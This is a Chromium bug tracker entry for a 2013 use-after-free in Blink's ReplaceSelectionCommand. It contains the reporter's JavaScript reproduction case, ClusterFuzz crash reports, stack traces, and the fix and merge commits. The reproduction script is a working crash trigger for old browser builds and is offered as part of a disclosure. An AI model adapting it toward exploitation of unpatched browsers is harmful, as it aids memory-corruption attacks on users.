# Heap-use-after-free in WebCore::ReplaceSelectionCommand::doApply

| Field | Value |
|-------|-------|
| **Issue ID** | [40078331](https://issues.chromium.org/issues/40078331) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Editing |
| **Reporter** | cl...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2013-11-03 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the chrome ASAN build.

The vulnerability is potentially exploitable as an attacker will be able to gain JavaScript execution between the free and the use of a Node object.

The freed Node object is allocated during the "indent" execCommand, it is then freed during a call to execCommand "forwardDelete". In between both commands JavaScript code can be executed.

The vulnerable function ReplaceSelectionCommand::doApply keeps a pointer to the freed Node through the local variable "Node\* startBlock". My guess would be that making startBlock a RefPtr will fix the issue.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-232589  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o30=document.documentElement;
document.execCommand('selectall',false,null);
o54=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o54.onload=cb\_dyniframes\_39\_1;
o30.appendChild(o54);
}
function cb\_dyniframes\_39\_1() {
document.designMode='on';
document.execCommand('justifyfull',false,null);
document.execCommand('insertimage',false,'x.gif');
document.execCommand('indent',false,null);
document.execCommand('inserthtml',false,'<iframe></iframe>')
document.execCommand('inserthtml',false,'<iframe src="javascript:window.top.cb\_insertscript\_107\_1()"></iframe>');
}
function cb\_insertscript\_107\_1() {
document.execCommand('justifyleft',false,null);
document.execCommand('indent',false,null);
document.execCommand('forwardDelete',false,null);
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: see attached stack.txt

## Attachments

- [stack.txt](attachments/stack.txt) (text/plain; charset=us-ascii, 11.7 KB)

## Timeline

### cl...@chromium.org (2013-11-03)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=6087400241496064

### cl...@chromium.org (2013-11-03)

Adding area label based on an intelligent guess!

Can one of the cc-ed folks please take a look or find someone else to own it.

- Your friendly ClusterFuzz

### in...@chromium.org (2013-11-03)

Yosin@, why does Cr-Blink-Editing label not cc you ?

### cl...@chromium.org (2013-11-03)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6087400241496064

Uploader: jschuh@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60f000000728
Crash State:
  - crash stack -
  WebCore::ReplaceSelectionCommand::doApply
  WebCore::CompositeEditCommand::apply
  - free stack -
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94knLAlRlZvTTEAZcM36UgN90QVi3xGbQjmg8fXJEPGif1TFm_9qQPeepwk51fbq6MeebSNKz4H4qfkByzLXSvHjWabHsPtTJLhqTgGlfXdMNCxPCPOR8xhiFJ9nhDSiLaaxEPNs12nL-f3IElZT-WLCMS80A



### jw...@chromium.org (2013-11-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-03)

Adding milestone and impact labels.

### cl...@chromium.org (2013-11-03)

Fixing bug priority based on security_severity-* and releaseblock-* labels.

### in...@chromium.org (2013-11-05)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-05)

i am testing some stuff with sheriffbot, so ignore last few comments from me, clusterfuzz@

### cl...@chromium.org (2013-11-05)

yosin: Can you please take a look or find someone else to own it.

- Your friendly ClusterFuzz

### in...@chromium.org (2013-11-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-05)

Adding area label based on an intelligent guess!

yosin: Can you please take a look or find someone else to own it.

- Your friendly ClusterFuzz

### yo...@chromium.org (2013-11-06)

Sorry for late response. I was OOF last week.

Variable |startBlock| in ReplaceSelectionCommand::doApply is used after free.

# Here is stack trace on Win:

webkit.dll!WebCore::TreeScope::rootNode() Line 95
webkit.dll!WebCore::Node::isTreeScope() Line 263
webkit.dll!WebCore::Node::isShadowRoot() Line 265
webkit.dll!WebCore::Node::parentNode() Line 894
webkit.dll!WebCore::ReplaceSelectionCommand::doApply() Line 1117
webkit.dll!WebCore::CompositeEditCommand::apply() Line 186
webkit.dll!WebCore::executeInsertFragment(WebCore::Frame & frame, WTF::PassRefPtr<WebCore::DocumentFragment> fragment) Line 195
webkit.dll!WebCore::executeInsertHTML(WebCore::Frame & frame, WebCore::Event * __formal, WebCore::EditorCommandSource __formal, const WTF::String & value) Line 499
webkit.dll!WebCore::Editor::Command::execute(const WTF::String & parameter, WebCore::Event * triggeringEvent) Line 1681
webkit.dll!WebCore::Document::execCommand(const WTF::String & commandName, bool userInterface, const WTF::String & value) Line 4009
webkit.dll!WebCore::DocumentV8Internal::execCommandMethod(const v8::FunctionCallbackInfo<v8::Value> & info) Line 4230
webkit.dll!WebCore::DocumentV8Internal::execCommandMethodCallback(const v8::FunctionCallbackInfo<v8::Value> & info) Line 4236
v8.dll!v8::internal::FunctionCallbackArguments::Call(void (const v8::FunctionCallbackInfo<v8::Value> &) * f) Line 57
v8.dll!v8::internal::HandleApiCallHelper<0>(v8::internal::`anonymous-namespace'::BuiltinArguments<1> args, v8::internal::Isolate * isolate) Line 1210
v8.dll!v8::internal::Builtin_HandleApiCall(int args_length, v8::internal::Object * * args_object, v8::internal::Isolate * isolate) Line 1225
3f90c136()	Unknown
[Frames below may be incorrect and/or missing]	
3f94a59f()	Unknown
3f910c21()	Unknown
3f93f512()	Unknown
3f922d6a()	Unknown
v8.dll!v8::internal::Invoke(bool is_construct, v8::internal::Handle<v8::internal::JSFunction> function, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * args, bool * has_pending_exception) Line 119
v8.dll!v8::internal::Execution::Call(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::Object> callable, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * argv, bool * pending_exception, bool convert_receiver) Line 183
v8.dll!v8::Function::Call(v8::Handle<v8::Value> recv, int argc, v8::Handle<v8::Value> * argv) Line 4082
webkit.dll!WebCore::V8ScriptRunner::callFunction(v8::Handle<v8::Function> function, WebCore::ExecutionContext * context, v8::Handle<v8::Value> receiver, int argc, v8::Handle<v8::Value> * info, v8::Isolate * isolate) Line 135
webkit.dll!WebCore::ScriptController::callFunction(WebCore::ExecutionContext * context, v8::Handle<v8::Function> function, v8::Handle<v8::Object> receiver, int argc, v8::Handle<v8::Value> * info, v8::Isolate * isolate) Line 178
webkit.dll!WebCore::ScriptController::callFunction(v8::Handle<v8::Function> function, v8::Handle<v8::Object> receiver, int argc, v8::Handle<v8::Value> * info) Line 153
webkit.dll!WebCore::V8EventListener::callListenerFunction(WebCore::ExecutionContext * context, v8::Handle<v8::Value> jsEvent, WebCore::Event * event) Line 92
webkit.dll!WebCore::V8AbstractEventListener::invokeEventHandler(WebCore::ExecutionContext * context, WebCore::Event * event, v8::Local<v8::Value> jsEvent) Line 129
webkit.dll!WebCore::V8AbstractEventListener::handleEvent(WebCore::ExecutionContext * context, WebCore::Event * event) Line 94
webkit.dll!WebCore::EventTarget::fireEventListeners(WebCore::Event * event, WebCore::EventTargetData * d, WTF::Vector<WebCore::RegisteredEventListener,1> & entry) Line 330
webkit.dll!WebCore::EventTarget::fireEventListeners(WebCore::Event * event) Line 276
webkit.dll!WebCore::Node::handleLocalEvents(WebCore::Event * event) Line 2258
webkit.dll!WebCore::EventContext::handleLocalEvents(WebCore::Event * event) Line 62
webkit.dll!WebCore::EventDispatcher::dispatchEventAtTarget() Line 162
webkit.dll!WebCore::EventDispatcher::dispatch() Line 119
webkit.dll!WebCore::EventDispatchMediator::dispatchEvent(WebCore::EventDispatcher * dispatcher) Line 53
webkit.dll!WebCore::EventDispatcher::dispatchEvent(WebCore::Node * node, WTF::PassRefPtr<WebCore::EventDispatchMediator> mediator) Line 50
webkit.dll!WebCore::Node::dispatchEvent(WTF::PassRefPtr<WebCore::Event> event) Line 2276
webkit.dll!WebCore::DOMWindow::dispatchLoadEvent() Line 1593
webkit.dll!WebCore::DOMWindow::dispatchWindowLoadEvent() Line 432
webkit.dll!WebCore::DOMWindow::documentWasClosed() Line 437
webkit.dll!WebCore::Document::implicitClose() Line 2335
webkit.dll!WebCore::FrameLoader::checkCompleted() Line 428
webkit.dll!WebCore::FrameLoader::finishedParsing() Line 362
webkit.dll!WebCore::Document::finishedParsing() Line 4285
webkit.dll!WebCore::HTMLConstructionSite::finishedParsing() Line 457
webkit.dll!WebCore::HTMLTreeBuilder::finished() Line 2841
webkit.dll!WebCore::HTMLDocumentParser::end() Line 754
webkit.dll!WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd() Line 765
webkit.dll!WebCore::HTMLDocumentParser::prepareToStopParsing() Line 198
webkit.dll!WebCore::HTMLDocumentParser::attemptToEnd() Line 776
webkit.dll!WebCore::HTMLDocumentParser::finish() Line 824
webkit.dll!WebCore::DocumentWriter::end() Line 131
webkit.dll!WebCore::DocumentLoader::endWriting(WebCore::DocumentWriter * writer) Line 886
webkit.dll!WebCore::DocumentLoader::finishedLoading(double finishTime) Line 315
webkit.dll!WebCore::DocumentLoader::maybeLoadEmpty() Line 804
webkit.dll!WebCore::DocumentLoader::startLoadingMainResource() Line 816
webkit.dll!WebCore::FrameLoader::loadWithNavigationAction(const WebCore::ResourceRequest & request, const WebCore::NavigationAction & action, WebCore::FrameLoadType type, WTF::PassRefPtr<WebCore::FormState> formState, const WebCore::SubstituteData & substituteData, WebCore::ClientRedirectPolicy clientRedirect, const WTF::String & overrideEncoding) Line 1367
webkit.dll!WebCore::FrameLoader::load(const WebCore::FrameLoadRequest & passedRequest) Line 728
webkit.dll!WebKit::WebFrameImpl::createChildFrame(const WebCore::FrameLoadRequest & request, WebCore::HTMLFrameOwnerElement * ownerElement) Line 2213
webkit.dll!WebKit::FrameLoaderClientImpl::createFrame(const WebCore::KURL & url, const WTF::String & name, const WTF::String & referrer, WebCore::HTMLFrameOwnerElement * ownerElement) Line 596
webkit.dll!WebCore::HTMLFrameOwnerElement::loadOrRedirectSubframe(const WebCore::KURL & url, const WTF::AtomicString & frameName, bool lockBackForwardList) Line 142
webkit.dll!WebCore::HTMLFrameElementBase::openURL(bool lockBackForwardList) Line 93
webkit.dll!WebCore::HTMLFrameElementBase::setNameAndOpenURL() Line 143
webkit.dll!WebCore::HTMLFrameElementBase::didNotifySubtreeInsertionsToDocument() Line 160
webkit.dll!WebCore::ChildNodeInsertionNotifier::notify(WebCore::Node & node) Line 238
webkit.dll!WebCore::updateTreeAfterInsertion(WebCore::ContainerNode & parent, WebCore::Node & child) Line 980
webkit.dll!WebCore::ContainerNode::appendChild(WTF::PassRefPtr<WebCore::Node> newChild, WebCore::ExceptionState & es) Line 627
webkit.dll!WebCore::Node::appendChild(WTF::PassRefPtr<WebCore::Node> newChild, WebCore::ExceptionState & es) Line 479
webkit.dll!WebCore::V8Node::appendChildMethodCustom(const v8::FunctionCallbackInfo<v8::Value> & info) Line 119
webkit.dll!WebCore::NodeV8Internal::appendChildMethodCallbackForMainWorld(const v8::FunctionCallbackInfo<v8::Value> & info) Line 676
v8.dll!v8::internal::FunctionCallbackArguments::Call(void (const v8::FunctionCallbackInfo<v8::Value> &) * f) Line 57
v8.dll!v8::internal::HandleApiCallHelper<0>(v8::internal::`anonymous-namespace'::BuiltinArguments<1> args, v8::internal::Isolate * isolate) Line 1210
v8.dll!v8::internal::Builtin_HandleApiCall(int args_length, v8::internal::Object * * args_object, v8::internal::Isolate * isolate) Line 1225
3f90c136()	Unknown
3f948aa0()	Unknown
3f948937()	Unknown
3f93f519()	Unknown
3f922d6a()	Unknown
v8.dll!v8::internal::Invoke(bool is_construct, v8::internal::Handle<v8::internal::JSFunction> function, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * args, bool * has_pending_exception) Line 119
v8.dll!v8::internal::Execution::Call(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::Object> callable, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * argv, bool * pending_exception, bool convert_receiver) Line 183
v8.dll!v8::Function::Call(v8::Handle<v8::Value> recv, int argc, v8::Handle<v8::Value> * argv) Line 4082
webkit.dll!WebCore::V8ScriptRunner::callFunction(v8::Handle<v8::Function> function, WebCore::ExecutionContext * context, v8::Handle<v8::Value> receiver, int argc, v8::Handle<v8::Value> * info, v8::Isolate * isolate) Line 135
webkit.dll!WebCore::ScriptController::callFunction(WebCore::ExecutionContext * context, v8::Handle<v8::Function> function, v8::Handle<v8::Object> receiver, int argc, v8::Handle<v8::Value> * info, v8::Isolate * isolate) Line 178
webkit.dll!WebCore::ScriptController::callFunction(v8::Handle<v8::Function> function, v8::Handle<v8::Object> receiver, int argc, v8::Handle<v8::Value> * info) Line 153
webkit.dll!WebCore::V8LazyEventListener::callListenerFunction(WebCore::ExecutionContext * context, v8::Handle<v8::Value> jsEvent, WebCore::Event * event) Line 103
webkit.dll!WebCore::V8AbstractEventListener::invokeEventHandler(WebCore::ExecutionContext * context, WebCore::Event * event, v8::Local<v8::Value> jsEvent) Line 129
webkit.dll!WebCore::V8AbstractEventListener::handleEvent(WebCore::ExecutionContext * context, WebCore::Event * event) Line 94
webkit.dll!WebCore::EventTarget::fireEventListeners(WebCore::Event * event, WebCore::EventTargetData * d, WTF::Vector<WebCore::RegisteredEventListener,1> & entry) Line 330
webkit.dll!WebCore::EventTarget::fireEventListeners(WebCore::Event * event) Line 276
webkit.dll!WebCore::DOMWindow::dispatchEvent(WTF::PassRefPtr<WebCore::Event> prpEvent, WTF::PassRefPtr<WebCore::EventTarget> prpTarget) Line 1609
webkit.dll!WebCore::DOMWindow::dispatchLoadEvent() Line 1582
webkit.dll!WebCore::DOMWindow::dispatchWindowLoadEvent() Line 432
webkit.dll!WebCore::DOMWindow::documentWasClosed() Line 437
webkit.dll!WebCore::Document::implicitClose() Line 2335
webkit.dll!WebCore::FrameLoader::checkCompleted() Line 428
webkit.dll!WebCore::FrameLoader::finishedParsing() Line 362
webkit.dll!WebCore::Document::finishedParsing() Line 4285
webkit.dll!WebCore::HTMLConstructionSite::finishedParsing() Line 457
webkit.dll!WebCore::HTMLTreeBuilder::finished() Line 2841
webkit.dll!WebCore::HTMLDocumentParser::end() Line 754
webkit.dll!WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd() Line 765
webkit.dll!WebCore::HTMLDocumentParser::prepareToStopParsing() Line 198
webkit.dll!WebCore::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk> popChunk) Line 442
webkit.dll!WebCore::HTMLDocumentParser::pumpPendingSpeculations() Line 476
webkit.dll!WebCore::HTMLDocumentParser::didReceiveParsedChunkFromBackgroundParser(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk> chunk) Line 321
webkit.dll!WTF::FunctionWrapper<void (__thiscall WebCore::HTMLDocumentParser::*)(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>::operator()(const WTF::WeakPtr<WebCore::HTMLDocumentParser> & c, WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk> p1) Line 210
webkit.dll!WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (__thiscall WebCore::HTMLDocumentParser::*)(WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>,void __cdecl(WTF::WeakPtr<WebCore::HTMLDocumentParser>,WTF::PassOwnPtr<WebCore::HTMLDocumentParser::ParsedChunk>)>::operator()() Line 421
wtf.dll!WTF::Function<void __cdecl(void)>::operator()() Line 577
wtf.dll!WTF::callFunctionObject(void * context) Line 63
glue_child.dll!base::internal::RunnableAdapter<void (__cdecl*)(void *)>::Run(void * const & a1) Line 171
glue_child.dll!base::internal::InvokeHelper<0,void,base::internal::RunnableAdapter<void (__cdecl*)(void *)>,void __cdecl(void * const &)>::MakeItSo(base::internal::RunnableAdapter<void (__cdecl*)(void *)> runnable, void * const & a1) Line 872
glue_child.dll!base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (__cdecl*)(void *)>,void __cdecl(void *),void __cdecl(void *)>,void __cdecl(void *)>::Run(base::internal::BindStateBase * base) Line 1169
base.dll!base::Callback<void __cdecl(void)>::Run() Line 396
base.dll!base::MessageLoop::RunTask(const base::PendingTask & pending_task) Line 493
base.dll!base::MessageLoop::DeferOrRunPendingTask(const base::PendingTask & pending_task) Line 506
base.dll!base::MessageLoop::DoWork() Line 617
base.dll!base::MessagePumpForUI::DoRunLoop() Line 243
base.dll!base::MessagePumpWin::RunWithDispatcher(base::MessagePump::Delegate * delegate, base::MessagePumpDispatcher * dispatcher) Line 65
base.dll!base::MessagePumpWin::Run(base::MessagePump::Delegate * delegate) Line 48
base.dll!base::MessageLoop::RunInternal() Line 441
base.dll!base::MessageLoop::RunHandler() Line 414
base.dll!base::RunLoop::Run() Line 48
base.dll!base::MessageLoop::Run() Line 312
base.dll!base::Thread::Run(base::MessageLoop * message_loop) Line 159
base.dll!base::Thread::ThreadMain() Line 205
base.dll!base::`anonymous namespace'::ThreadFunc(void * params) Line 74
kernel32.dll!7656336a()	Unknown
ntdll.dll!77a39f72()	Unknown
ntdll.dll!77a39f45()	Unknown


### yo...@chromium.org (2013-11-07)

The root cause is the script in javascript protocol URI in iframe/@src changes DOM tree although editing code doesn't aware that.

I thought to postpone javascript execution for iframe/@src to fix this bug. However, this doesn't solve other cases executing scripts during editing code.

So, I'll change editing code to handle DOM tree changes.

### yo...@chromium.org (2013-11-07)

in review: https://codereview.chromium.org/64103002


### bu...@chromium.org (2013-11-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=161598

------------------------------------------------------------------------
r161598 | yosin@chromium.org | 2013-11-08T10:06:18.939474Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/editing/ReplaceSelectionCommand.cpp?r1=161598&r2=161597&pathrev=161598
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/inserting/insert-with-javascript-protocol-crash-expected.txt?r1=161598&r2=161597&pathrev=161598
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/editing/CompositeEditCommand.cpp?r1=161598&r2=161597&pathrev=161598
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/inserting/insert-with-javascript-protocol-crash.html?r1=161598&r2=161597&pathrev=161598

Make "InsertHTML" and "Indent" commands to handle DOM tree modification during processing

This patch makes "InsertHTML" and "Indent" commands to handle DOM tree modification during processing. When calling Node::insertBefore(), JavaScript may be executed, e.g. <iframe src="javascript:...">, and it modifies DOM tree.

On https://crbug.com/chromium/314469, use-after-free is caused at |startBlock| variable which holds raw Node pointer removed during script execution in ReplaceSelectionCommand::doApply().

Changes for CompositeEditCommand::cloneParagraphUnderNewElement() is similar to ReplaceSelectionCommand::doApply(). |outerNode| is removed during CompositeEditCommand::appendNode(), which inserts <iframe src="javascript:...">.

BUG=314469
TEST=LayoutTests/editing/inserting/insert-with-javascript-protocol-crash.html

Review URL: https://codereview.chromium.org/64103002
------------------------------------------------------------------------

### yo...@chromium.org (2013-11-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-08)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

Your fix is very close to the branch point. After the branch happens, please make sure to check if your fix is in.

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-11-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-11-09)

ClusterFuzz has detected this issue as fixed in range 233904:233963.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6087400241496064

Uploader: jschuh@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60f000000728
Crash State:
  - crash stack -
  WebCore::ReplaceSelectionCommand::doApply
  WebCore::CompositeEditCommand::apply
  - free stack -
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=233904:233963

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94knLAlRlZvTTEAZcM36UgN90QVi3xGbQjmg8fXJEPGif1TFm_9qQPeepwk51fbq6MeebSNKz4H4qfkByzLXSvHjWabHsPtTJLhqTgGlfXdMNCxPCPOR8xhiFJ9nhDSiLaaxEPNs12nL-f3IElZT-WLCMS80A

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### cl...@chromium.org (2013-11-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-20)

Please remember to set Merge-Requested after sufficient bake time.

### in...@chromium.org (2013-11-20)

[Empty comment from Monorail migration]

### la...@google.com (2013-11-20)

Approved for M31.

### bu...@chromium.org (2013-11-21)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=162425

------------------------------------------------------------------------
r162425 | yosin@chromium.org | 2013-11-21T01:36:36.856165Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1650/Source/core/editing/ReplaceSelectionCommand.cpp?r1=162425&r2=162424&pathrev=162425
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/editing/inserting/insert-with-javascript-protocol-crash-expected.txt?r1=162425&r2=162424&pathrev=162425
   M http://src.chromium.org/viewvc/blink/branches/chromium/1650/Source/core/editing/CompositeEditCommand.cpp?r1=162425&r2=162424&pathrev=162425
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/editing/inserting/insert-with-javascript-protocol-crash.html?r1=162425&r2=162424&pathrev=162425

Merge 161598 "Make "InsertHTML" and "Indent" commands to handle ..."

> Make "InsertHTML" and "Indent" commands to handle DOM tree modification during processing
> 
> This patch makes "InsertHTML" and "Indent" commands to handle DOM tree modification during processing. When calling Node::insertBefore(), JavaScript may be executed, e.g. <iframe src="javascript:...">, and it modifies DOM tree.
> 
> On https://crbug.com/chromium/314469, use-after-free is caused at |startBlock| variable which holds raw Node pointer removed during script execution in ReplaceSelectionCommand::doApply().
> 
> Changes for CompositeEditCommand::cloneParagraphUnderNewElement() is similar to ReplaceSelectionCommand::doApply(). |outerNode| is removed during CompositeEditCommand::appendNode(), which inserts <iframe src="javascript:...">.
> 
> BUG=314469
> TEST=LayoutTests/editing/inserting/insert-with-javascript-protocol-crash.html
> 
> Review URL: https://codereview.chromium.org/64103002

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/77763009
------------------------------------------------------------------------

### in...@chromium.org (2013-11-21)

putting merge-requested for m32.

### ka...@google.com (2013-11-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-11-21)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=162447

------------------------------------------------------------------------
r162447 | yosin@chromium.org | 2013-11-21T06:37:03.966207Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1700/Source/core/editing/CompositeEditCommand.cpp?r1=162447&r2=162446&pathrev=162447
   A http://src.chromium.org/viewvc/blink/branches/chromium/1700/LayoutTests/editing/inserting/insert-with-javascript-protocol-crash.html?r1=162447&r2=162446&pathrev=162447
   M http://src.chromium.org/viewvc/blink/branches/chromium/1700/Source/core/editing/ReplaceSelectionCommand.cpp?r1=162447&r2=162446&pathrev=162447
   A http://src.chromium.org/viewvc/blink/branches/chromium/1700/LayoutTests/editing/inserting/insert-with-javascript-protocol-crash-expected.txt?r1=162447&r2=162446&pathrev=162447

Merge 161598 "Make "InsertHTML" and "Indent" commands to handle ..."

> Make "InsertHTML" and "Indent" commands to handle DOM tree modification during processing
> 
> This patch makes "InsertHTML" and "Indent" commands to handle DOM tree modification during processing. When calling Node::insertBefore(), JavaScript may be executed, e.g. <iframe src="javascript:...">, and it modifies DOM tree.
> 
> On https://crbug.com/chromium/314469, use-after-free is caused at |startBlock| variable which holds raw Node pointer removed during script execution in ReplaceSelectionCommand::doApply().
> 
> Changes for CompositeEditCommand::cloneParagraphUnderNewElement() is similar to ReplaceSelectionCommand::doApply(). |outerNode| is removed during CompositeEditCommand::appendNode(), which inserts <iframe src="javascript:...">.
> 
> BUG=314469
> TEST=LayoutTests/editing/inserting/insert-with-javascript-protocol-crash.html
> 
> Review URL: https://codereview.chromium.org/64103002

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/80333002
------------------------------------------------------------------------

### mb...@chromium.org (2013-12-03)

Thanks for the report! This one qualifies for a $2000 reward because while there is control between the free and use, it is inside the Node heap partition.

### pa...@chromium.org (2013-12-18)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-12-18)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-12-20)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-28)

Bulk update: removing view restriction from closed bugs.

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/314469?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/317424]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078331)*
